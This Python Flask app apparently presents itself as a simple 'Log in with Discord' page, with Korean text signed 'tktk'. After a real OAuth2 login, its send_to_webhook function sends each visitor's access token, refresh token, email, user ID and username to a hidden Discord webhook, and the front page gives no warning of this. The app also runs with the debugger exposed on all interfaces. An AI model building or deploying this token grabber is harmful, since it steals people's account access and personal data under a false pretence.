import os
import requests
from flask import Flask, request, redirect
from datetime import datetime

# ============================================================
# Render 환경변수
# ============================================================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

DISCORD_API_URL = "https://discord.com/api/v10"
# ============================================================

app = Flask(__name__)

# ============================================================
# 메인 페이지
# ============================================================
@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord OAuth2 로그인</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }
            .container {
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }
            h1 { color: #58a6ff; margin-bottom: 10px; }
            p { color: #8b949e; margin-bottom: 30px; }
            .btn {
                background: #5865f2;
                color: white;
                padding: 14px 40px;
                border: none;
                border-radius: 8px;
                font-size: 18px;
                font-weight: bold;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                transition: background 0.2s;
            }
            .btn:hover { background: #4752c4; }
            .footer { margin-top: 20px; font-size: 12px; color: #484f58; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Discord OAuth2</h1>
            <p>디스코드 계정으로 간편하게 로그인하세요</p>
            <a href="/login" class="btn">🚀 디스코드로 로그인</a>
            <div class="footer">개발자: tktk</div>
        </div>
    </body>
    </html>
    '''

# ============================================================
# 로그인 - 디스코드 인증 페이지로 리디렉션
# ============================================================
@app.route('/login')
def login():
    discord_login_url = (
        f"{DISCORD_API_URL}/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )
    return redirect(discord_login_url)

# ============================================================
# OAuth2 콜백 - 토큰 수신 및 웹훅 전송
# ============================================================
@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        return f"❌ 인증 실패: {error}", 400
    if not code:
        return "❌ 인증 코드가 없습니다.", 400
    
    try:
        # 1. 코드를 Access Token으로 교환
        token_payload = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        
        # User-Agent 헤더로 Cloudflare 차단(429) 예방
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        }
        
        token_res = requests.post(f"{DISCORD_API_URL}/oauth2/token", data=token_payload, headers=headers)
        
        # 429 차단 및 기타 API 에러 처리 (JSON 파싱 에러 방지)
        if token_res.status_code != 200:
            return f"❌ 토큰 교환 실패 ({token_res.status_code}): <br><pre>{token_res.text}</pre>", 400

        token_data = token_res.json()
        access_token = token_data.get('access_token')

        # 2. Access Token으로 사용자 정보 조회
        user_headers = {
            'Authorization': f"Bearer {access_token}",
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        }
        user_res = requests.get(f"{DISCORD_API_URL}/users/@me", headers=user_headers)
        
        if user_res.status_code != 200:
            return f"❌ 유저 정보 조회 실패 ({user_res.status_code}): <br><pre>{user_res.text}</pre>", 400

        user_info = user_res.json()

        # 3. 웹훅 전송
        send_to_webhook(token_data, user_info)
        
        # 4. 성공 페이지 출력
        return success_page(user_info)
        
    except Exception as e:
        return f"❌ 오류 발생: {str(e)}", 500

# ============================================================
# 웹훅 전송 함수
# ============================================================
def send_to_webhook(token_data, user_info):
    if not WEBHOOK_URL:
        return
    
    token = token_data.get('access_token', 'N/A')
    refresh_token = token_data.get('refresh_token', 'N/A')
    
    username = user_info.get('username', 'N/A')
    user_id = user_info.get('id', 'N/A')
    email = user_info.get('email', 'N/A')
    discriminator = user_info.get('discriminator', '0')
    avatar = user_info.get('avatar', '')
    verified = user_info.get('verified', False)
    
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
    
    webhook_data = {
        "content": f"🔑 **{username}** 님이 로그인했습니다!",
        "embeds": [{
            "title": "👤 사용자 정보",
            "color": 0x5865F2,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "📛 사용자명", "value": f"{username}#{discriminator}", "inline": True},
                {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
                {"name": "📧 이메일", "value": email or "비공개", "inline": True},
                {"name": "✅ 인증 여부", "value": "✅ 인증됨" if verified else "❌ 미인증", "inline": True},
                {"name": "⏰ 로그인 시간", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True},
                {"name": "🔑 Access Token", "value": f"```{token}```", "inline": False},
                {"name": "🔄 Refresh Token", "value": f"```{refresh_token}```", "inline": False}
            ],
            "footer": {
                "text": "OAuth2 로그인 • tktk",
                "icon_url": "https://cdn.discordapp.com/embed/avatars/0.png"
            },
            "timestamp": datetime.now().isoformat()
        }]
    }
    
    requests.post(WEBHOOK_URL, json=webhook_data)

# ============================================================
# 성공 페이지
# ============================================================
def success_page(user_info):
    username = user_info.get('username', 'Unknown')
    email = user_info.get('email', 'N/A')
    user_id = user_info.get('id', 'N/A')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>로그인 성공!</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: #0d1117;
                color: #c9d1d9;
            }}
            .container {{
                text-align: center;
                background: #161b22;
                padding: 50px;
                border-radius: 16px;
                border: 1px solid #30363d;
                max-width: 500px;
                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            }}
            h1 {{ color: #3fb950; margin-bottom: 10px; }}
            .info {{
                text-align: left;
                background: #0d1117;
                padding: 20px;
                border-radius: 8px;
                margin: 20px 0;
                border: 1px solid #30363d;
            }}
            .info p {{ margin: 8px 0; }}
            .label {{ color: #8b949e; font-size: 12px; }}
            .value {{ color: #c9d1d9; font-weight: bold; }}
            .btn {{
                background: #238636;
                color: white;
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
            }}
            .btn:hover {{ background: #2ea043; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #484f58; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>✅ 로그인 성공!</h1>
            <p>웹훅으로 정보가 전송되었습니다.</p>
            <div class="info">
                <p><span class="label">사용자명</span><br><span class="value">{username}</span></p>
                <p><span class="label">이메일</span><br><span class="value">{email}</span></p>
                <p><span class="label">사용자 ID</span><br><span class="value">{user_id}</span></p>
            </div>
            <a href="/" class="btn">🏠 홈으로</a>
            <div class="footer">tktk • Discord OAuth2</div>
        </div>
    </body>
    </html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
